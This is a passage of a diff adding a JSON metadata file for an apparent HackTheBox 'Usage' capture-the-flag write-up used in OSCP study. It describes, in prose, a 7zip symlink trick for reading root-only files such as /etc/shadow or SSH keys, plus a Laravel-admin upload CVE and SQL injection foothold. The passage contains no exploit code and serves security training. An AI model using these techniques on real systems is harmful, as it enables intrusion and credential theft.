+      "detail": "7zip running as root with source directory writable by low-priv user = arbitrary file read. Even with -snl flag (store symlinks as links), @listfile feature reads symlink targets. Pattern: Any compression tool (tar, zip, 7z) with wildcards + writable source + sudo = check for symlink abuse.",
+      "importance": "medium",
+      "notes": "Advanced technique but demonstrates important concept"
+    },
+    {
+      "category": "general",
+      "lesson": "Time management: Fast path vs research path",
+      "detail": "SQLi + file upload foothold: 90 minutes (manageable). Symlink privesc: 45 minutes (with research). Total: 135 minutes realistic exam time. OSCP STRATEGY: If stuck on complex privesc >30 minutes, enumerate for simpler vectors. This machine teaches advanced techniques but simpler paths usually exist in exam.",
+      "importance": "critical"
+    }
+  ],
+
+  "alternative_approaches": {
+    "foothold": [
+      {
+        "method": "Automated CVE exploitation tools",
+        "description": "Public PoC scripts exist for CVE-2023-24249 that automate the file upload bypass",
+        "oscp_applicable": false,
+        "reasoning": "Automated exploit scripts not available in OSCP exam. Manual exploitation required for learning."
+      }
+    ],
+    "privilege_escalation": [
+      {
+        "method": "Alternative 7zip targets",
+        "description": "Instead of SSH key, could read /etc/shadow (crack root password) or /root/root.txt directly",
+        "oscp_applicable": true,
+        "notes": "SSH key preferred for persistence and more realistic compromise"
+      }
+    ]
+  },
+
+  "time_breakdown": {
+    "enumeration": 15,
+    "foothold_sqli": 60,
+    "foothold_file_upload": 30,
+    "lateral_movement": 20,
+    "privilege_escalation_analysis": 25,
+    "privilege_escalation_exploitation": 20,
+    "total_minutes": 170,
+    "total_hours": 2.83,
+    "flags_captured": {
+      "user": "/home/dash/user.txt",
+      "root": "/root/root.txt"
+    },
+    "oscp_time_estimate": "120-180 minutes depending on experience level"
+  },
+
+  "references": [
+    {
+      "type": "cve",
+      "id": "CVE-2023-24249",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-24249",
+      "description": "Laravel-admin 1.8.18 arbitrary file upload vulnerability"
+    },
+    {
+      "type": "blogpost",
+      "url": "https://flyd.uk/post/cve-2023-24249/",
+      "description": "Detailed analysis of CVE-2023-24249 exploitation technique",
+      "author": "flyd"
+    },
+    {
+      "type": "hacktricks",
+      "url": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/7z-symlink-abuse",
+      "description": "7zip symlink abuse privilege escalation techniques"
+    },
+    {
+      "type": "tool",
+      "name": "sqlmap",
+      "url": "https://github.com/sqlmapproject/sqlmap",
+      "documentation": "https://github.com/sqlmapproject/sqlmap/wiki"
+    },
+    {
+      "type": "tool",
+      "name": "revshells",
+      "url": "https://www.revshells.com/",
+      "description": "Reverse shell payload generator"
+    },
+    {
+      "type": "mitre_attack",
+      "technique": "T1190",
+      "name": "Exploit Public-Facing Application",
+      "url": "https://attack.mitre.org/techniques/T1190/"
+    },
+    {
+      "type": "mitre_attack",
+      "technique": "T1078",
+      "name": "Valid Accounts",
+      "url": "https://attack.mitre.org/techniques/T1078/"
+    }
+  ],
+
+  "files": {
+    "original_writeup": "/home/kali/Desktop/OSCP/crack/db/data/writeups/hackthebox/Usage/Usage.txt",
+    "metadata": "/home/kali/Desktop/OSCP/crack/db/data/writeups/hackthebox/Usage/Usage.json",
+    "images": "/home/kali/Desktop/OSCP/crack/db/data/writeups/hackthebox/Usage/images/"
+  }
+}
